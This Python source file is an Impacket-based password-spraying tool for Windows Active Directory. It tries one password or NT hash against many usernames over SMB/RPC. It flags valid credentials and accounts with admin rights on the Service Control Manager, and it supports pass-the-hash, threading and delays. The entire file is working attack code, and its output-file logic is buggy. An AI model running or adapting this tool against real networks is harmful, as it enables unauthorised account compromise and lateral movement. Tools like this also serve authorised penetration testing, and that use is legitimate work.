from impacket.dcerpc.v5 import transport, scmr
from pebble import ProcessPool
from impacket import version
from time import sleep

import argparse
import logging
import sys
import os

###################COLORS#################
color_RED = '\033[91m'
color_GRE = '\033[92m'
color_YELL = '\033[93m'
color_reset = '\033[0m'
green_plus = "{}[+]{}".format(color_GRE, color_reset)
red_minus = "{}[-]{}".format(color_RED, color_reset)
gold_plus = "{}[+]{}".format(color_YELL, color_reset)

def sendit(username, password, domain, remoteName, remoteHost, hashes=None,aesKey=None, doKerberos=None, kdcHost=None, port=445):
    upasscombo = '{}:{}'.format(username, password)

    nthash = ''
    lmhash = ''
    if hashes is not None:
        lmhash, nthash = hashes.split(':')
        upasscombo = '{}:{}'.format(username, nthash)

    stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
    logging.debug('StringBinding %s' % stringbinding)
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    rpctransport.set_dport(port)
    rpctransport.setRemoteHost(remoteHost)

    if hasattr(rpctransport, 'set_credentials'):
        # This method exists only for selected protocol sequences.
        rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey)

    rpctransport.set_kerberos(doKerberos, kdcHost)

    try:
        samr = rpctransport.get_dce_rpc()

        try:
            samr.connect()
        except Exception as e:
            print(red_minus, upasscombo.ljust(30), str(e)[:str(e).find("(")])
            if options.o is not None:
                with open(options.p, 'a') as f:
                    f.write(red_minus, upasscombo.ljust(30), str(e)[:str(e).find("(")])
                    f.close()

        s = rpctransport.get_smb_connection()
        s.setTimeout(100000)
        samr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(samr)
        scHandle = resp['lpScHandle']

        print(gold_plus, upasscombo.ljust(30), "Valid Admin Creds")
        if options.o is not None:
             with open(options.p, 'a') as f:
                 f.write(gold_plus, upasscombo.ljust(30), "Valid Admin Creds")
                 f.close()

    except  (Exception, KeyboardInterrupt) as e:

        if str(e).find("rpc_s_access_denied") != -1 and str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") == -1:
            print(green_plus, upasscombo.ljust(30), "Valid Creds")
            if options.o is not None:
                with open(options.p, 'a') as f:
                    f.write(green_plus, upasscombo.ljust(30), "Valid Creds")
                    f.close()

def mt_execute(username):  # multithreading requires a function
    try:
        sendit(username, options.p, options.d, options.target, options.target, options.H, None, False, None, int(445))
    except Exception as e:
        print(str(e))
        if options.o is not None:
            with open(options.o, 'a') as f:
                f.write(str(e))
                f.close()

    if options.delay is not None:
        sleep(options.delay)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=True, description="Impacket made password sprayer for Windows AD")
    parser.add_argument('-u', action='store', help='Username or path to file containing usernames 1 per line')
    parser.add_argument('-p', action='store', help='Password to try')
    parser.add_argument('-d', action='store', help='FQDN to use')
    parser.add_argument('-H', action='store', help='Password hash to use LM:NT')
    parser.add_argument('-o', action='store', help='Output file')
    parser.add_argument('-s', action='store_true', default=False, help='Quiet mode will only print valid accounts')
    parser.add_argument('-threads', action='store', default=1, type=int, help='Number of threads to use (Default=1)')
    parser.add_argument('-delay', action='store', type=int, help='Number of seconds to wait between each account')
    parser.add_argument('target', action='store', help='IP to check the account against')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    if options.d is None:
        print(red_minus + " Domain is required")
        sys.exit(0)

    if options.p is None and options.u != '' and options.H is None:
        from getpass import getpass

        options.p = getpass("Password:")

    if options.H is not None:
        if options.H.find(':') == -1:
            options.H = ':' + options.H

    users = []
    users_cleaned = []

    if os.path.isfile(options.u):
        with open(options.u, 'r') as f:
            users = f.readlines()
            f.close()

        for item in users:
            item = item.replace("\r", "")
            users_cleaned.append(item.replace("\n", ""))
    else:
        users_cleaned.append(options.u)

    if options.delay is not None:
        options.threads = 1

    with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
        for username in users_cleaned:
            try:
                out = thread_exe.schedule(mt_execute, (username,), timeout=10)
            except Exception as e:
                print(str(e))
